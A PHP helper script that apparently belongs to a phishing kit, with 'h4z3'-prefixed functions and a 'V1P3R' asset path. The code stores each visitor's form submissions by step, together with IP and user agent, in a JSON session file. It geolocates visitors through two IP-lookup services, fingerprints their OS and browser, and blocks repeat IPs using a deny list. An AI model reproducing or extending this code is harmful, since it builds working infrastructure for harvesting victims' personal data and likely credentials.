<?php 
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

function h4z3_get_session_storage_path()
{
    global $sessionStoragePath;

    if (empty($sessionStoragePath)) {
        $sessionStoragePath = __DIR__ . '/../storage/session_data.json';
    }

    $directory = dirname($sessionStoragePath);
    if (!is_dir($directory)) {
        mkdir($directory, 0755, true);
    }

    if (!file_exists($sessionStoragePath)) {
        file_put_contents($sessionStoragePath, json_encode(["sessions" => []], JSON_PRETTY_PRINT), LOCK_EX);
    }

    return $sessionStoragePath;
}

function h4z3_initialize_tracking_session()
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    if (empty($_SESSION['h4z3_tracking_id'])) {
        $sessionId = session_id();
        if (empty($sessionId)) {
            $sessionId = bin2hex(random_bytes(16));
        }
        $_SESSION['h4z3_tracking_id'] = $sessionId;
    }

    return $_SESSION['h4z3_tracking_id'];
}

function h4z3_load_session_store()
{
    $path = h4z3_get_session_storage_path();
    $contents = file_get_contents($path);
    $decoded = json_decode($contents, true);

    if (!is_array($decoded)) {
        $decoded = ["sessions" => []];
    }

    if (!isset($decoded['sessions']) || !is_array($decoded['sessions'])) {
        $decoded['sessions'] = [];
    }

    return $decoded;
}

function h4z3_write_session_store(array $store)
{
    $path = h4z3_get_session_storage_path();
    file_put_contents($path, json_encode($store, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
}

function h4z3_store_submission($step, array $payload)
{
    $sessionId = h4z3_initialize_tracking_session();
    $store = h4z3_load_session_store();

    if (!isset($store['sessions'][$sessionId])) {
        $store['sessions'][$sessionId] = [
            'handled' => false,
            'entries' => [],
        ];
    }

    $normalizedPayload = [];
    foreach ($payload as $key => $value) {
        if (is_scalar($value) || is_null($value)) {
            $normalizedPayload[$key] = $value;
        } else {
            $normalizedPayload[$key] = json_encode($value);
        }
    }

    $entry = [
        'timestamp' => gmdate('c'),
        'step' => $step,
        'payload' => $normalizedPayload,
        'meta' => [
            'ip' => $_SERVER['REMOTE_ADDR'] ?? null,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
        ],
    ];

    $store['sessions'][$sessionId]['entries'][] = $entry;
    $store['sessions'][$sessionId]['last_updated'] = $entry['timestamp'];

    h4z3_write_session_store($store);
}
###########################################################
$ip2 = getUserIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}
###########################################################
$ip = getUserIP();
if($ip == "127.0.0.1") {
    $ip = "";
}
###########################################################
function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}
###########################################################
function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}
###########################################################
$details = get_ip1($ip2);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$data="../V1P3R/img/icon.ico";$deny='google-images';
$cn = $countryname;
$cid = $countrycode;
$continent = $details['geoplugin_continentName'];
$citykota = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$kurenci = $details['geoplugin_currencySymbol_UTF8'];
$details = get_ip2($ip2);
$details = json_decode($details, true);
###########################################################
function getIp() {
	    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
	                $IPaddress = trim($IPaddress);
	                if (filter_var($IPaddress,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $IPaddress;
	                }
	            }
	        }
	    }
	}
###########################################################
function clientData($ss) {
	   	$ch = curl_init();
	   	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	   	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	   	curl_setopt($ch, CURLOPT_URL,"http://www.geoplugin.net/json.gp?ip=".getIp());
	   	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0); 
		curl_setopt($ch, CURLOPT_TIMEOUT, 400);
	   	$json = curl_exec($ch);
	   	curl_close($ch);
	   	
	    if ($json == false) {
	        return "127.0.0.1";
	    }
	   	$code = json_decode($json);
	    switch ($ss) {
	        case "code":
	            $str = $code->geoplugin_countryCode;
	            break;
	        case "country":
	            $str = $code->geoplugin_countryName;
	            break;
	        case "city":
	            $str = $code->geoplugin_city;
	            break;
	        case "state":
	            $str = $code->geoplugin_region;
	            break;
	        case "timezone":
	            $str = $code->geoplugin_timezone;
	            break;
	        case "currency":
	            $str = $code->geoplugin_currencyCode;
	            break;
	        default:
	            $str = $code->geoplugin_request;
	    }
	   	return $str;
	}
###########################################################
function accessOneTimeIP($ip){
	$text = file_get_contents("denyip.txt");
	$ipArray = explode("\n", $text);
	if (in_array($ip, $ipArray)) {
		return false;
	}else{
		return true;
	}
}
###########################################################
function getOs() {
	    $os_platform = "Unknown OS";
	    $all       =   array(
	                            '/windows nt 10/i'     =>  'Windows 10',
	                            '/windows nt 6.3/i'     =>  'Windows 8.1',
	                            '/windows nt 6.2/i'     =>  'Windows 8',
	                            '/windows nt 6.1/i'     =>  'Windows 7',
	                            '/windows nt 6.0/i'     =>  'Windows Vista',
	                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                            '/windows nt 5.1/i'     =>  'Windows XP',
	                            '/windows xp/i'         =>  'Windows XP',
	                            '/windows nt 5.0/i'     =>  'Windows 2000',
	                            '/windows me/i'         =>  'Windows ME',
	                            '/win98/i'              =>  'Windows 98',
	                            '/win95/i'              =>  'Windows 95',
	                            '/win16/i'              =>  'Windows 3.11',
	                            '/macintosh|mac os x/i' =>  'Mac OS X',
	                            '/mac_powerpc/i'        =>  'Mac OS 9',
	                            '/linux/i'              =>  'Linux',
	                            '/ubuntu/i'             =>  'Ubuntu',
	                            '/iphone/i'             =>  'iPhone',
	                            '/ipod/i'               =>  'iPod',
	                            '/ipad/i'               =>  'iPad',
	                            '/android/i'            =>  'Android',
	                            '/blackberry/i'         =>  'BlackBerry',
	                            '/webos/i'              =>  'Mobile');
	    foreach ($all as $regex => $value) { 
	        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
	            $os_platform = $value;
	        }
	    }   
	    return $os_platform;
	}
###########################################################
function getBrowser() {
	    $browser = "Unknown Browser";
	    $all  =   array(
                        '/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
	    foreach ($all as $regex => $value) { 
	        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
	            $browser = $value;
	        }
	    }
	    return $browser;
	}
$br   = getBrowser();
$os   = getOs();
$date = date("d M, Y");
$time = date("g:i a");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
$key = substr(sha1(mt_rand()),1,25);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");